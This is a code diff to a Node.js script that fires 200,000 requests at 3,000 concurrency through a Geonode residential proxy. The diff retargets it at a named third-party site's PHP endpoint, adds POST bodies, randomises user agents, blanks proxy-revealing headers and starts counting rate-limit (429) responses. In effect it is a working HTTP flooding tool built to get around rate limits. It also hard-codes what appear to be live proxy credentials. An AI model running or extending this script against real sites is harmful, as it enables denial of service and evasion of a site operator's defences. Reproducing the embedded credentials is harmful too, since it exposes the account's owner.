@@ -7,14 +7,14 @@ import axios from "axios";
 // Geonode Proxy Configuration
 const GEONODE_USERNAME = 'geonode_svsVqfLttY-type-residential';
 const GEONODE_PASSWORD = '0ea5b7f5-88ad-4668-9028-14f2614d10fe';
-const GEONODE_HOST = 'proxy.geonode.io';
+const GEONODE_HOST = 'sg.proxy.geonode.io';
 const GEONODE_PORT = 9000;
 const GEONODE_PROXY = `http://${GEONODE_USERNAME}:${GEONODE_PASSWORD}@${GEONODE_HOST}:${GEONODE_PORT}`;
 
-const endpoint = "http://ec2-15-228-158-129.sa-east-1.compute.amazonaws.com/gonzo";
+const endpoint = "http://infousados.com/subcategories.php";
 const totalRequests = 200000;
 const timeoutMs = 20000;
-const concurrency = 1000;
+const concurrency = 3000;
 
 const stats = {
   success: 0,
@@ -59,7 +59,9 @@ async function testWithProxy(attempt, signal) {
     const agent = new HttpsProxyAgent(GEONODE_PROXY);
     agent.options.rejectUnauthorized = false;
 
-    const response = await axios.get(endpoint, {
+    const response = await axios.post(endpoint,{
+      categories_id: 64,
+    }, {
       proxy: {
         host: GEONODE_HOST,
         port: GEONODE_PORT,
@@ -74,6 +76,9 @@ async function testWithProxy(attempt, signal) {
         "User-Agent": agents[Math.floor(Math.random() * agents.length)],
         "Accept-Language": "en-US,en;q=0.9",
         "Cache-Control": "no-cache",
+        "X-Forwarded-For": "",
+        Forwarded: "",
+        Via: "",
         Pragma: "no-cache",
       },
     });
@@ -91,7 +96,7 @@ async function testWithProxy(attempt, signal) {
     if (err.name === "CanceledError") return;
     
     stats.failed++;
-    if (err.code === "ECONNABORTED" || err.name === "TimeoutError") {
+    if (err?.response?.status === 429) {
       stats.timeouts++;
       if (attempt % 50 === 0) {
         console.log(chalk.yellow(`[${attempt}] Timeout via ${GEONODE_HOST}`));
